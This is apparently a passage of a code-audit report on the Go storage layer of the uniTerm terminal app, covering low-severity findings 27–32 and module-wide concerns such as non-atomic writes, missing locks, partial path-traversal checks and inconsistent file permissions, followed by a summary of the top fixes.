**AUDIT-store-27: `parseFrontmatter` line-folding logic only handles leading whitespace of 2 spaces or tab — frontmatter that uses 4-space indent or no indent mis-folds.**
- File: `backend/store/skills_store.go:89-146`
- Severity: P3
- Failure scenario: User imports a skill whose `description: >` is followed by 4-space-indented continuation lines (valid YAML). `parseFrontmatter` doesn't accumulate them (line 111 checks for `strings.HasPrefix(line, "  ")` only). The continuation is dropped; description is truncated at the first line.
- Wrong output: long descriptions truncated on round-trip.
- Fix category: either drop the homegrown parser in favour of `gopkg.in/yaml.v3` or accept any leading whitespace as a continuation cue.

**AUDIT-store-28: `skillNameRe = ^[a-z0-9][a-z0-9-]*$` accepts uppercase via case-folding only in `ImportFromDir`/`ImportFromZip` — the regex is ASCII-only, but a name with Unicode letters (e.g. `café`) is rejected. Different code paths use different validation.**
- File: `backend/store/skills_store.go:28`, `skills_store.go:206, 553, 603, 692`.
- Severity: P3 (UX inconsistency, not security)
- Failure scenario: User names a skill `Récap` in the UI. `CreateSkill` at line 691 rejects with "invalid skill name". User renames to `recap` (ASCII). Works. But if the name is sourced from a zip's frontmatter, the same regex applies, so Unicode names are uniformly rejected — but the UI's "save" button is greyed out only after the user has typed a full string, no inline validation.
- Wrong output: confusing UX; no Unicode support.
- Fix category: extend regex to Unicode (e.g. `\p{L}\p{N}` after the first char) — and unify across `Create`/`ImportFromDir`/`ImportFromZip` (they already share the regex).

**AUDIT-store-29: `appDir := filepath.Join(configDir, "uniTerm")` is computed independently in every `New*Store` constructor — a future change to the dir name requires editing 7 files (`ConnectionStore`, `AISessionStore`, `SettingsStore`, then implicit via `app.go:156` for the others).**
- File: `backend/store/{ai_session_store.go:43, connection_store.go:35, settings_store.go:124}.go` and `app.go:156`.
- Severity: P3
- Failure scenario: User wants to rename the config dir to `uniterm` (lowercase). Three constructors hardcode `"uniTerm"` and three store constructors (`NewLocalStateStore`, `NewQuickCommandsStore`, `NewSkillsStore`, `NewCommandsStore`, `NewTunnelStore`, `NewRecentStore`, `NewTerminalHistoryStore`) accept the dir as a parameter, so the renaming lives in `app.go:156`. Easy to miss.
- Wrong output: drift between constructors; some stores point to `uniTerm` and others to the new name.
- Fix category: hoist `appDir := filepath.Join(configDir, appName)` into a single helper (`AppConfigDir()`) in the `store` package and call it from each constructor.

**AUDIT-store-30: `recent.json` is only the file written with `json.Marshal` (no indent) — every other store uses `MarshalIndent("", "  ", "")`.**
- File: `backend/store/recent_store.go:94` vs. all other stores.
- Severity: P3
- Failure scenario: If a user opens `recent.json` in a text editor to debug "why is my recent list empty?", they see one giant line. The connection store / settings file are formatted. Inconsistent UX for debugging.
- Wrong output: confusing debugging experience.
- Fix category: use `json.MarshalIndent(s.ids, "", "  ")` for consistency.

**AUDIT-store-31: `LocalStateStore.Save` is called with `_ = ...` in two of three call sites (`app.go:245` window-state, `app.go:432` `SaveLocalState`) — error swallowed; only the third (`app.go:261` `SaveWindowState`) propagates the error.**
- File: `backend/store/local_state_store.go:43-49`, callers in `app.go:245, 261, 432`.
- Severity: P3 (related to CONCERNS § "Migration safety net relies on error swallowing" but for a different file — the silent-window-state path is a new instance).
- Failure scenario: User's `local_state.json` write fails (disk full). The window position is lost on next launch. The user has no diagnostic because no error is surfaced.
- Wrong output: silent loss of window geometry.
- Fix category: log and surface the error (similar pattern to AUDIT-store-21).

**AUDIT-store-32: `parseFrontmatter` returns `fm.argumentHint = ""` for `argument-hint:` keys but stores it in `SkillMeta` (not currently exposed) and `CommandMeta.ArgumentHint` (exposed via `app.go:851` via `commandsStore.GetBody` only — not in `List()`).**
- File: `backend/store/skills_store.go:138`, `backend/store/commands_store.go:127-132`.
- Severity: P3
- Failure scenario: User expects the commands list to show `argumentHint` in the UI. `List()` at line 127-132 sets `Description` but not `ArgumentHint` on the returned meta. The frontend never sees it.
- Wrong output: command argument hints never surfaced in the list view.
- Fix category: add `ArgumentHint` to the `CommandMeta` returned from `List()`.

---

## Cross-cutting concerns within module

- **No atomic write pattern anywhere.** Every store calls `os.WriteFile` directly. A single helper `atomicWriteFile(path, data, mode)` (write-temp + fsync + rename) would fix AUDIT-store-03, AUDIT-store-10, AUDIT-store-12, AUDIT-store-21 in one stroke and harden AUDIT-store-05 against partial corruption.
- **Lock discipline is inconsistent.** `RecentStore` is the only store with a mutex. `SkillsStore`/`CommandsStore`/`ConnectionStore`/`SettingsStore`/`AISessionStore`/`LocalStateStore`/`QuickCommandsStore`/`TunnelStore`/`TerminalHistoryStore` have **none**. The pattern of `loadPrefs → mutate → savePrefs` in skills/commands is read-modify-write under no lock — guaranteed racy under sync + UI interaction.
- **Silent error swallowing on load.** `ai_session_store.go:72`, `local_state_store.go:73`, `settings_store.go:171`, `terminal_history_store.go:67` all `return default, nil` on unmarshal failure. None of them rename the corrupt file to a `.corrupt-<ts>` sidecar, so the original bytes are gone forever (CONCERNS partial overlap with § "Migration safety net"; not duplicated).
- **No size caps on input.** `connectionStore.Save` accepts an arbitrary `[]ConnectionConfig`. A 100 MB blob from a malicious frontend (or a legitimate bulk import) blocks the Go process during marshal. None of the stores call `io.LimitReader` on their JSON load path (skills use it on `SKILL.md` only).
- **Path-traversal protections are partial.** `GetSkillFile` checks `..` and absolute paths. `Delete` does not. `ImportFromDir`/`ImportFromZip` do not validate the *source* paths (only the destination `fm.name`).
- **Permissions are inconsistent within the module.** 14 sites write `0600` (most stores), 5 sites write `0644` (skill/command `.md` files, `recent.json`). The rationale for `0644` on `recent.json` is undocumented; for `.md` files it makes the AI runtime's read path simpler but allows tampering.
- **No rollback on migration failure.** `populatePasswords`, `SettingsStore.Load` migration block, and the skills/commands pref autosave all run under no lock and provide no transactional rollback. A crash between keychain update and JSON write (AUDIT-store-12) is unrecoverable.
- **Test coverage is 1 file of 11** (`recent_store_test.go`). Every other store is untested — already in CONCERNS § "Test Coverage Gaps", not re-flagged here beyond AUDIT-store-25.

---

## Summary

- Total findings: 32 (P0: 4, P1: 8, P2: 12, P3: 8)
- Confidence: high
- Top 3 fixes (highest leverage):
  1. **Atomic write helper** (AUDIT-store-03) — eliminates the root cause of 4+ findings.
  2. **Per-store mutex** (AUDIT-store-05/06) — eliminates the data-divergence class of bugs.
  3. **Keychain-failure-closed** (AUDIT-store-04) — closes the plaintext-password escape hatch that CONCERNS already flagged in theory but is wider in practice.
- Note: 1 finding (AUDIT-store-07) was downgraded from P1 to P2 after re-reading; the lock pattern is correct, just slightly heavy.
- Pre-existing `CONCERNS.md` overlaps already noted in the intro (plaintext-password and error-swallowing) were intentionally NOT duplicated as new findings.